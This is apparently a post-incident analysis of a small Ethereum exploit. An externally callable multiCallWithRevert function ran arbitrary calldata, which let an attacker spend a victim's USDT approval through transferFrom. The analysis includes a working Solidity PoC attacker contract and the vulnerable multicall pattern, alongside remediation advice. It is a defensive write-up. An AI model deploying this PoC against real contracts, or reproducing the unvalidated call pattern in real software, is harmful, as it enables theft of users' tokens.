# Unverified 0x16d0 — multiCallWithRevert Unauthorized transferFrom Vulnerability Analysis

| Field | Details |
|------|------|
| **Date** | 2024-09-04 |
| **Protocol** | Unverified Contract 0x16d0 |
| **Chain** | Ethereum |
| **Loss** | ~329 USD |
| **Attacker** | [0x101723de](https://etherscan.io/address/0x101723dEf8695f5bb8D5d4AA70869c10b5Ff6340) |
| **Attack Tx** | [0xf5f251fd](https://app.blocksec.com/explorer/tx/eth/0xf5f251fd4ed77e24d803d8241e2e852f0781a145891411dd4eb45306eacf12a8) |
| **Vulnerable Contract** | [0x16d0dc96](https://etherscan.io/address/0x16d0dc96c1bdf283ce1ff10e01924ac76b06c95c) |
| **Root Cause** | multiCallWithRevert() executes arbitrary calldata without validation — exploits addr2's USDT approval to execute transferFrom |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-09/unverified_16d0.sol) |

---
## 1. Vulnerability Overview

The 0x16d0dc96 contract exposed a `multiCallWithRevert(address token, bytes[] calldata data)` function externally. This function executes the provided calldata array against the token contract sequentially without any validation. addr2 (0x2C45a940) had granted an unlimited USDT approval to addr1 (0x16d0dc96). The attacker inserted `transferFrom(addr2, tx.origin, bal)` calldata into multiCallWithRevert to drain addr2's USDT.

## 2. Vulnerable Code Analysis

```solidity
// ❌ 0x16d0dc96: multiCallWithRevert arbitrary calldata execution
contract Vulnerable0x16d0 {
    // ❌ No caller validation
    // ❌ No calldata content validation
    function multiCallWithRevert(address token, bytes[] calldata data) external {
        for (uint i = 0; i < data.length; i++) {
            // ❌ Executes data[i] against token as-is
            // Any ERC20 function including transferFrom can be executed
            (bool ok, ) = token.call(data[i]);
            if (!ok) revert();
        }
    }
}

// ✅ Fix:
// Only execute whitelisted function selectors
// require(msg.sender == owner, "unauthorized");
// Verify that transferFrom's `from` is an allowed address
```

### On-chain Original Code

Source: Sourcify verified

```solidity
// File: Unverified16d0_decompiled.sol
contract Unverified16d0 {
    function multiCallWithRevert(address p0, bytes[] memory p1) external {}  // ❌ Vulnerability
```

## 3. Attack Flow

```
Attacker (0x101723de)
  │
  ├─[1]─▶ Check addr2's USDT balance
  │         bal = USDT.balanceOf(addr2)
  │
  ├─[2]─▶ Check addr2→addr1 allowance
  │         allw = USDT.allowance(addr2, addr1)
  │         → Confirm allw > bal (unlimited approval exists)
  │
  ├─[3]─▶ Construct calldata:
  │         calls[0] = abi.encode(
  │             0x23b872dd,  // transferFrom selector
  │             addr2,       // from (victim)
  │             tx.origin,   // to (attacker)
  │             bal          // full balance
  │         )
  │
  ├─[4]─▶ addr1.multiCallWithRevert(USDT, calls)
  │         └─ ❌ Executes transferFrom without validation
  │             addr2's USDT → transferred to attacker
  │
  └─[5]─▶ ~329 USD USDT drained
```

## 4. PoC Code

```solidity
contract AttackerC {
    function attack() public {
        uint256 bal = ITetherToken(TetherToken).balanceOf(addr2);
        uint256 allw = ITetherToken(TetherToken).allowance(addr2, addr1);

        // Confirm addr2 has granted sufficient approval to addr1
        if (bal < allw && bal > 0) {
            bytes[] memory calls = new bytes[](1);
            // ❌ Construct transferFrom(addr2, attacker, bal) calldata
            calls[0] = abi.encode(
                bytes4(0x23b872dd),  // transferFrom
                addr2,               // from (victim)
                tx.origin,           // to (attacker)
                bal                  // full USDT balance
            );

            // ❌ Execute arbitrary transferFrom via multiCallWithRevert
            (bool ok, ) = addr1.call(
                abi.encodeWithSignature(
                    "multiCallWithRevert(address,bytes[])",
                    TetherToken,
                    calls
                )
            );
            require(ok, "attack failed");
        }
    }
}
```

## 5. Vulnerability Classification

| Category | Details |
|------|-----------|
| **Vulnerability Type** | Arbitrary External Call / Missing Access Control |
| **Attack Vector** | multiCallWithRevert + existing approval exploitation |
| **CWE** | CWE-20: Improper Input Validation |
| **DASP** | Access Control Vulnerability |
| **Severity** | Medium |

## 6. Remediation Recommendations

1. **Selector whitelist**: Restrict executable function selectors to a pre-approved list
2. **`from` validation**: Verify that transferFrom's `from` is the contract itself or an authorized address
3. **Access control**: Restrict multiCallWithRevert to be callable only by privileged addresses
4. **Minimize approvals**: Do not grant unlimited approvals to external contracts

## 7. Lessons Learned

- General-purpose execution functions like `multiCallWithRevert`, when exposed externally without calldata validation, become an immediate fund-draining vector.
- Contracts with existing approvals (especially unlimited approvals) combined with a vulnerable multicall function are susceptible to compound attacks.
- Even a small loss (329 USD) becomes catastrophic if the same pattern is applied to accounts holding larger approvals.